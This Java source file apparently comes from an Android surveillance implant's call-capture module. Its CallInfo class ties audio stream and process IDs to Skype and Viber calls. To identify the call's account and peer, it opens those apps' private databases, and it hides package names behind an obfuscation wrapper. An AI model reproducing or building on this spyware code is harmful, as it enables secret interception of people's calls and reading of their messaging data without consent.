package com.android.dvci.module.call;

import java.util.Date;

import com.android.dvci.auto.Cfg;
import com.android.dvci.db.GenericSqliteHelper;
import com.android.dvci.listener.ListenerProcess;
import com.android.dvci.module.chat.ChatSkype;
import com.android.dvci.module.chat.ChatViber;
import com.android.dvci.util.Check;
import com.android.mm.M;

public class CallInfo {
	private static final String TAG = "CallInfo";

	public int id;
	public String account;
	public String peer;
	public String displayName;
	public boolean incoming;
	public boolean valid;
	public String processName;
	public int programId;
	public Date timestamp;
	public boolean delay;
	public boolean realRate;
	private long[] streamId = new long[2];

	public String getCaller() {
		if (!incoming) {
			return account;
		}
		return peer;
	}

	public String getCallee() {
		if (incoming) {
			return account;
		}
		return peer;
	}

	public boolean setStreamId(boolean remote, long streamId) {

		int pos = remote ? 1 : 0;
		if (streamId != this.streamId[pos]) {

			if (this.streamId[pos] != 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (setStreamId): Wrong streamId: " + this.streamId[pos] + " <- " + streamId + " "
							+ (remote ? "remote" : "local"));
				}
				this.streamId[pos] = streamId;
				return false;
			}

			this.streamId[pos] = streamId;
		}

		return true;
	}
	public boolean setStreamPid( int pid) {

		if (pid != this.programId) {

			if (this.programId != 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (setStreamPid): Wrong pid: " + this.programId + " <- " + pid );
				}
				this.programId = pid;
				return false;
			}

			if(pid != 0) {
				this.programId = pid;
			}
		}

		return true;
	}
	public boolean update(boolean end){

		// RunningAppProcessInfo fore = runningProcesses.getForeground();
		if (this.valid) {
			return true;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (update), programId: " + this.programId);
		}

		if(!this.incoming && this.programId == 0 && end){
			// HACK: fix this thing.
			// the last local viber chunk has pid 0, we fix it here
			this.programId = 0x0148;
		}

		if ( this.programId == 0x0146 ) {
			if (Cfg.DELAY_SKYPE_CALL) {

				this.processName = M.e("com.skype.raider");
				// open DB


				this.delay = true;
				this.realRate = false;

				boolean ret = false;
				if (end) {
					String account = ChatSkype.readAccount();
					this.account = account;

					GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);
					if (helper != null) {
						ret = ChatSkype.getCurrentCall(helper, this);
						if (Cfg.DEBUG) {
							Check.log(TAG + " (updateCallInfo): id: " + this.id + " peer: " + this.peer);
						}
					}
				} else {
					this.account = M.e("delay");
					this.peer = M.e("delay");
					ret = true;
				}

				return ret;
			} else {

				if (end) {
					return true;
				}
				this.processName = M.e("com.skype.raider");
				// open DB
				String account = ChatSkype.readAccount();
				this.account = account;
				this.programId = 0x0146;
				this.delay = false;
				this.realRate = false;

				GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);

				boolean ret = false;
				if (helper != null) {
					ret = ChatSkype.getCurrentCall(helper, this);
					if (Cfg.DEBUG) {
						Check.log(TAG + " SKYPE (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:"+ ret);
					}
				}

				return ret;
			}
		} else if ( this.programId == 0x0148  ) {
			boolean ret = false;
			this.processName = M.e("com.viber.voip");
			this.delay = true;
			this.realRate = true;

			// open DB
			this.programId = 0x0148;
			if (end) {
				String account = ChatViber.readAccount();
				this.account = account;
				GenericSqliteHelper helper = ChatViber.openViberDBHelperCall();

				if (helper != null) {
					ret = ChatViber.getCurrentCall(helper, this);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (updateCallInfo) id: " + this.id);
				}
			} else {
				this.account = M.e("delay");
				this.peer = M.e("delay");
				ret = true;
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " VIBER (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:"+ ret);
			}

			return ret;

		}
		return false;
	}

}
